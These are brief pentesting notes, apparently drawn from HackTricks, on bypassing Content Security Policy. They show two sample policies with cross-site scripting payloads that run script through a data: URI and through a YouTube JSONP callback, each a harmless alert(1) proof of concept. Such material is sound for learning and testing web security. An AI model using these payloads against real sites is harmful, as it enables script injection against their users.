___

Content Security Policy
https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
# Data

```
content-security-policy
	script-src 'self' https://app.hackinghub.io data:
```

```html
<script src=data:text/javascript,alert(1)></script>
```

# 3rd Party Domains JSONP

```
content-security-policy
	script-src 'self' https://app.hackinghub.io https://www.google.com https://www.youtube.com
```


```html
<script/src=https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=oOfgVmxBk6U&callback=alert(1)></script>
```

